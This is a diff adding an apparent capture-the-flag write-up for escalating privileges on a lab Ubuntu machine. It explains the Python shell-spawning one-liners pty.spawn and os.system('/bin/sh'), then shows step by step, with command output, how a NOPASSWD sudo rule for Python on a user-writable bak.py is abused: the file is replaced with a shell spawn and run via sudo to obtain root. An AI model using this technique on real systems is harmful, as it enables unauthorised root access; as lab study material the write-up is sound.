@@ -1,0 +1,102 @@
+------------------------------------------------------------------------------------------------------------------------------------
+NOTE:-
+
+1.) 
+import pty; pty.spawn('/bin/sh')
+
+🔍 Explanation:
+
+    pty.spawn() is used to spawn a new pseudo-terminal. This makes the shell behave more like a regular terminal.
+
+    It's commonly used after gaining a shell in CTFs or reverse shells to make it easier to interact (e.g., get clear output, use tab, Ctrl+C).
+    
+2.)
+import os; os.system("/bin/sh")
+
+does the following:
+
+    import os: Loads Python’s built-in os module, which allows interaction with the operating system.
+
+    os.system("/bin/sh"): Executes a system shell (sh) using the /bin/sh binary.
+
+⚠️ Real-world impact:
+
+    It starts a new shell session (subshell) from within Python.
+
+    This is not a reverse shell or anything interactive over the network—it's a local shell.
+
+🔐 Security Warning:
+
+Running this in a vulnerable Python environment (e.g., via input injection) can lead to code execution—it’s often used in CTFs or exploiting insecure web apps.
+
+------------------------------------------------------------------------------------------------------------------------------------
+
+STEP 1 :-
+CMD:-sudo -l
+Matching Defaults entries for meliodas on ubuntu:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User meliodas may run the following commands on ubuntu:
+    (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.p
+    
+we need to show what inside bak file
+
+STEP 2:-
+CMD:-cat /home/meliodas/bak.py
+#!/usr/bin/env python
+import os
+import zipfile
+
+def zipdir(path, ziph):
+    for root, dirs, files in os.walk(path):
+        for file in files:
+            ziph.write(os.path.join(root, file))
+
+if __name__ == '__main__':
+    zipf = zipfile.ZipFile('/var/backups/website.zip', 'w', zipfile.ZIP_DEFLATED)
+    zipdir('/var/www/html', zipf)
+    zipf.close()
+
+here we show the bak is uses zip file but the zip file is empty.
+here we also show the file have privilages like -rw-r--r- bak.py
+
+STEP 3:-
+but this file is in meliodas directory so we uses delete and make new bak.py file using nano
+
+rm -rf bak.py
+rm: remove write-protected regular file 'bak.py'? yes
+
+nano bak.py
+import os; os.system("/bin/sh")
+or we also uses import pty;pty.spawn("/bin/sh")
+anyone we uses
+
+than execute using python 
+
+python bak.py
+ id
+uid=1000(meliodas) gid=1000(meliodas) groups=1000(meliodas),4(adm),24(cdrom),30(dip),46(plugdev),114(lpadmin),115(sambashare)
+
+here we show the we gain shell but this shell is meliodas but we need to gain root shell
+
+
+STEP 4:-
+
+CMD:-sudo -l
+Matching Defaults entries for meliodas on ubuntu:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User meliodas may run the following commands on ubuntu:
+    (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.p
+    
+this will show how to execute file but these only work when we in meliodas directory
+
+CMD:-pwd
+ANS:- meliodas
+
+CMD:-sudo /usr/bin/python  /home/meliodas/bak.py
+ 
+#id
+uid=0(root) gid=0(root) groups=0(root)
+
+here we gain root shell.
